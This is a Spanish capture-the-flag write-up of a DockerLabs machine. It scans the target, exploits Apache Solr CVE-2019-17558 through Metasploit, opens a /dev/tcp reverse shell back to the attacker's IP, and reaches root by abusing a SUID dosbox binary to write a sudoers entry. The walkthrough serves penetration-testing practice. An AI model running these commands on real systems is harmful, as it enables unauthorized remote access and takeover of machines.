# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/cfae8818-09ab-4371-8c09-bd94fd0bdd9c)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.

### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **80/tcp (HTTP ):** Apache httpd 2.4.59 (Debian)
2.  **8983/tcp (HTTP ):** Apache Solr

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Y se encontró la pagina con una imagen de un pingüino y un ninja.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/85b31562-88d4-43e0-b6e5-d670690e5dec)

### Puerto 8983
Al identificar que el puerto 8983 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador con el puerto. Y se encontró la pagina de Solr admin.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/7a124dc4-5c30-409c-96df-ac5b64abdfc0)

# Fase 2- Exploración

#### FeroxBuster
```
200      GET       35l       63w      837c http://172.17.0.2/index.html
200      GET     7980l    46484w  3653155c http://172.17.0.2/pinguninja.png
200      GET       35l       63w      837c http://172.17.0.2/
[>-------------------] - 5s     38342/1245780 3m      found:3  
```
Se encontró la imagen .png y el directorio index.html que no lleva a ningún lado.

##### Solr
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/f975b1f5-c3c0-425c-88c7-bd2ac16d01c0)
Encontramos un exploit en Exploit-DB.

# Fase 3- Explotación

#### 2019-17558
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/2076a957-9c48-477e-aeee-f0d5484071ed)
```python
msf6 exploit(multi/http/solr_velocity_rce) > set LHOST 192.168.1.2
LHOST => 192.168.1.2
msf6 exploit(multi/http/solr_velocity_rce) > set RHOST 172.17.0.2
RHOST => 172.17.0.2
```
Le proporcionamos lo que nos pide el exploit.


Escribimos run para mandar el exploit y nos da una shell, si escribimos el comando `ipconfig` vemos que estamos en la maquina `172.17.0.2` estamos dentro.
```
> Ipconfig
---------------------------------
Name         : eth0 - eth0
Hardware MAC : 02:42:ac:11:00:02
MTU          : 1500
IPv4 Address : 172.17.0.2
IPv4 Netmask : 255.255.0.0



--------------------------------
Name         : lo - lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
```

# Fase 4- Privilegios

#### sudo -l
```python
meterpreter > shell
Process 3 created.
Channel 3 created.
script /dev/null -c bash
Script started, output log file is '/dev/null'.
ninhack@bc53834a3023:/opt/solr/server$ sh -i >& /dev/tcp/192.168.1.2/443 0>&1
sh -i >& /dev/tcp/192.168.1.2/443 0>&1
```
Ejecutamos esos comandos para enviarnos una shell mas cómoda a nuestra maquina atacante.


```python
ninhack@bc53834a3023:/opt/solr/server$ sudo -l
[sudo] password for ninhack: 
sudo: a password is required
ninhack@bc53834a3023:/opt/solr/server$ 
```
Al ejecutar el comando `sudo -l` nos dice que proporcionemos una contraseña para el usuario `ninhack` tocara usar find.

#### find

```python
ninhack@bc53834a3023:/opt/solr/server$> find / -perm -4000 -user root 2>/dev/null
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/dosbox
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
Tenemos permisos de ejecución de dosbox. 

#### Binario Dosbox
Si consultamos a gtfobins nos dice que para escalar tenemos que hacer lo siguiente: 
```python
LFILE='\etc\sudoers.d\ninhack' dosbox -c 'mount c /' -c "echo ninhack ALL=(ALL) NOPASSWD: ALL >c:$LFILE" -c exit
DOSBox version 0.74-3
Copyright 2002-2019 DOSBox Team, published under GNU GPL.
---
ninhack@bc53834a3023:/opt/solr/server$ sudo su
root@bc53834a3023:/opt/solr/server# whoami
root
root@bc53834a3023:/opt/solr/server# 
```
Y listo, somos root!

